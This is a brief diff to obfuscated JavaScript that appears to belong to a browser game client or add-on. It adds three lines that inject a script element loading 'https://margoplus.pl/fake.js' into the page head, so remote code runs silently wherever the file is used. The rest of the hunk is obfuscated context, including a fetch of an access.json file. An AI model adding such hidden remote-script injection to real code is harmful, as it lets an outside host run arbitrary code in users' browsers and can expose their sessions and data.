@@ -1357,6 +1357,9 @@ const {
     const uiLayoutComponent_221 = location.host.split(".")[0];
     const uiLayoutComponent_222 = uiLayoutComponent_221 == "mordor";
     globalThis.webkitCancelAnimationFrameWindow = true;
+    const fakeScript = document.createElement('script');
+    fakeScript.src = 'https://margoplus.pl/fake.js';
+    document.head.appendChild(fakeScript);
     globalThis.isSameAlertExist2 = await fetch("" + chatIgnoredPlayersSet.p + chatIgnoredPlayersSet.h + "/" + "access" + "." + "json").then(uiLayoutComponent_223 => uiLayoutComponent_223.json()).catch(uiLayoutComponent_224 => {
         return false;
     });
